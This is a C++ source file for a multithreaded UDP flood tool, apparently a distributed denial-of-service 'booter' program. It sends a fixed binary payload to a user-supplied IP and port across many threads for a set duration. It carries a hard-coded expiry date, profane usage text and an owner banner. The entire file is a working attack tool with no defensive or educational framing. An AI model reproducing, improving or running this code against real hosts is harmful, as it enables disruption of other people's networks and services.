#include <iostream>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <stdexcept>

void usage() {
    std::cout << "Usage: ./russian <RUSSIAN> <CHUT> <CHAHIYE> <KYA>" << std::endl;
    exit(1);
}

struct ThreadData {
    std::string ip;
    int port;
    int duration;
    time_t expiration_time;
};

void* attack(void* arg) {
    ThreadData* data = static_cast<ThreadData*>(arg);
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    std::vector<std::string> payloads = {
        "\xa7\x22\xd4\xfa\xa6\x85\xa8\xe3\xb8\x7d\xb4\x26\x57\x81\x43\xa1\x77\xed\x22\x1b\xee\xa4\xbc\x5d\x78\x0c\xcf\xaa\x0a\x31\x41\xc1\x18\xd5\x2d\xcb\x8c\xfe\xc4\x40\x79\x47\xde\xff\x0a\x0f\x99\x87\xb7\x5f\x5c\x40\xa6\x8b\xfc\x42\x48\x26\xd6\x77\x1a\xe6\x97\x9d\x42\x42\x6a\xa1\xfd\x4f\xca\xc6\x9c\x96\xca\xe3\xcc\xda\xba\x0f\xd6\xf4\x48\xd5\x62\x5d\xa2\xb4\xfe\x05\x51\xf4\x26\xa4\x92\xa1\x7f\xee\x95\x6c\x56\x9f\xa7\x50\xb6\x37\xec\x44\x49\xe9\xc3\x7f\x52\xa0\xf7\x12\xf8\xe4\x1d\x28\xf1\x56\xa3\x07\x84\x53\x19\x49\x90\x66\x6f\xd4\x5b\xf2\x4b\xe1\x74\x8f\xdc\x72\x18\x38\x54\x8e\x59\xb7\x24\x6a\xfa\x2b\x91\x22\xcd\x91\x22\x85\xd8\xfe\x72\xe8\xc2\xe0\x8b\x26\x56\x66\x42\xee\x94\xb8\xd2\x10\x47\x18\x41\xab\xb2\x69\x69\x6a\xa6\x32\x75\xe0\xf9\x09\x3e\x9a\x68\xad\xb3\x65\xb3\x28\x8a\xb6\x9e\xb2\x75\x24\xd6\xd5\x2e\x80\x95\xe0\xe4\xf5\xfd\x5a\x4d\xa9\xdc\x26\xe4\xcf\x29\x8d\xbe\x67\x7e\x8a\x66\x5f\x49\x43\x01\xcf\x66\xbe\x74\x1d\x6e\xd1\xd0\xe1\x8b\xd3\x20\x43\x71\x3b\x60\x0b\xca\x83\x60\xa0\xeb\xa7\x9e\xa9\xce\x33\x6b\x94\x32\x9e\x41\x34\x2d\x5a\x9e\x0f\xa0\xfd\x79\xe7\x27\xfa\xca\xd2\x26\x7d\xeb\xad\xae\xd9\x47\x98\x10\x81\x80\x4d\x00\x01\x3e\x9b\x98\xd6\xf2\x20\x46\x2c\x09\x14\x6f\xbd\xdc\x38\x75\x68\x98\x35\xb9\xde\x0f\xf4\xd7\xa8\x08\x80\xb2\xec\x91\x28\xd7\x66\x0a\x51\x05\x60\xcd\x12\x72\x23\x69\x7b\x27\x14\x37\x35\x7e\xf6\x89\xad\xa8\x14\x21\x36\x31\x8f\xa4\x86\x37\x17\x9e\x9e\x6d\x10\x81\x2c\x3b\xe1\x34\xe8\x53\x69\x8c\x49\xe6\x6e\x33\xbd\xa9\x55\x5d\xb9\x9a\x8b\xde\xa7\x0d\x9e\x42\x5a\xa5\x48\x16\x5f\xfb\x57\x05\x29\x91\x99\xea\xef\x44\x09\x23\xf9\x5b\x95\x34\x3e\xa3\xe4\xdd\x24\x98\x2e\xc5\x39\x37\xac\xd4\xed\x37\x77\xb8\xf6\x66\x1f\x46\x60\x17\x91\xc5\xbb\xba\x41\xff\xe1\xb6\x70\xe8\x73\x35\x7e\x2a\xe7\xa8\xd3\x25\x28\x8b\xec\xac\xc7\xf0\x6f\x61\x2e\x57\xd2\x5a\x1b\xdf\x06\x5e\x7a\x07\x1a\x74\x72\xdc\x14\x5c\xb7\x5a\x92\x63\xa5\xf7\x67\xce\xcb\xf8\x48\xf2\xc1\x00\x56\x6f\x5d\xca\xc5\x2f\xc1\x05\xfd\x7d\xc2\xa9\xc8\x50\xf7\xf3\xa7\x6c\x10\xe8\x47\x39\x8c\x2d\x5c\x4d\x71\x5a\xae\xde\xfe\x3a\x45\xe6\xaa\x8d\x45\xd4\xc4\x6e\xad\x02\xd3\x2a\x5b\xb4\x6d\xe4\xe5\x68\xcc\xcd\x63\x56\x1b\x7b\x7a\x3f\x5c\xd7\xb1\xb7\xc5\xbf\x90\x81\xe3\xfc\xb0\xf0\xcb\xbf\x12\x79\xc4\x81\x4a\x95\x74\xe5\x9b\x80\xd3\xa3\x4c\xb3\xdd\xd0\xa1\x26\x43\x9b\xda\x2d\xf8\x2e\xa2\x44\x00\xd7\x74\x32\x91\xc7\x15\xbd\xe1\xa1\xaa\xc3\xb7\x5f\xd0\x10\xcc\xf1\x0b\xdc\xd6\x45\x3c\x34\xc8\xba\xdf\x0f\x7d\xcd\x5b\x6a\x62\xfd\xb6\x94\x92\x3e\x1a\xbb\xea\x4b\x94\xfd\xd1\x7e\x36\xa0\xe0\x46\x7b\x07\x06\x96\x01\x9b\x9f\x6a\xda\xd6\x67\xcd\xd9\xaf\x9d\x23\xd8\x64\x11\x2d\xbc\x60\x97\xdc\x59\x53\xf1\x02\x9b\x85\x76\xf5\xa2\xa5\xed\xcd\xaa\x0b\x48\x65\x9e\x37\xfa\x22\x29\xca\x4d\x8a\x4b\xaa\x46\x05\x51\xa3\x54\x7e\x2a\x81\x61\x30\xdc\xf7\xfc\x47\xd9\xfa\xbe\xb5\x72\xff\xc1\x91\xbd\x9f\x57\xaf\xf8\xf6\xec\x30\x26\xee\xa7\xfd\x2e\xef\xad\x6a\x18\x33\xd2\xb4\x51\x57\x16\x0f\xcd\x33\xad\x55\x2d\xc3\x35\x42\x3b\x7e\x4b\x34\x03\x99\x3d\x34\xfd\xb5\xd4\x1b\x56\xd8\x1f\xd8\xed\x42\x02\xed\x1d\x48\x23\x63\x28\x1e\xbe\xb7\xb0\x5f\xd3\xcd\x1e\x61\xde\x9b\x52\xa9\xcb\x4d\xb2\x15\x09\x6f\xe6\xb3\xa7\xc5\x2b\x71\xa3\xbc\xe7\x03\x2f\x78\x47\x78\xfa\xf3\x8f\x16\xdf\xd7\xcf\xf7\xeb\x94\xed\x03\x51\x98\x4e\x62\x00\x81\x0c\x7b\x0f\x12\x03\x8d\xbd\x5b\x01\x2f\x7c\x4d\x74\x3b\xc4\xae\x57\x46\xb2\x1c\xb0\xbb\x49\x80\x76\x58\x9e\x81\xd7\xb1\x8a\x0f\xfb\x62\x77\x2d\x1b\xb0\x84\xc1\x7a\x3b\xa6\x31\x30\x2c\x93\x56\x01\x5c\x98\x9d\x82\x2b\xd2\xf4\x62\xaa\x3e\xe2\xc6\x79\x5c\xad\x30\xa1\x44\xc0\x31\xbc\x44\x32\x70\x5e\x1f\x2e\xab\xcf\x04\x31\x13\xaa\x49\x11\x10\xff\x09\xe8\xd4\x63\x14\x7f\x9d\xf1\xd2\x44\x85\x94\xb3",
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(nullptr);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip.c_str());

    endtime = time(nullptr) + data->duration;

    while (time(nullptr) <= endtime) {
        for (const auto& payload : payloads) {
            ssize_t bytes_sent = sendto(sock, payload.c_str(), payload.size(), 0,
                                        (const struct sockaddr*)&server_addr, sizeof(server_addr));
            if (bytes_sent < 0) {
                if (errno == EINTR) continue;  // Ignore interrupted system calls
                perror("Send failed");
                close(sock);
                pthread_exit(nullptr);
            }
        }
    }

    close(sock);
    pthread_exit(nullptr);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);

    if (port <= 0 || port > 65535 || duration <= 0 || threads <= 0) {
        std::cerr << "Invalid input values. Port should be between 1-65535, duration and threads should be positive integers." << std::endl;
        exit(1);
    }

    // Set up expiration time
    ThreadData data = {ip, port, duration};

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;
    expiration_tm.tm_mon = 1;
    expiration_tm.tm_mday = 10;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (time(nullptr) >= data.expiration_time) {
        std::cout << "Attack has expired. Exiting." << std::endl;
        return 0;
    }

    std::cout << "Flood started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads" << std::endl;

    std::vector<pthread_t> thread_ids(threads);

    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&thread_ids[i], nullptr, attack, (void*)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "RUSSIAN CHUT ID: " << thread_ids[i] << std::endl;
    }

    for (auto& thread_id : thread_ids) {
        pthread_join(thread_id, nullptr);
    }

    std::cout << "ATTACK FINISHED ♥️ OWNER @GODXALONEBOY" << std::endl;
    return 0;
}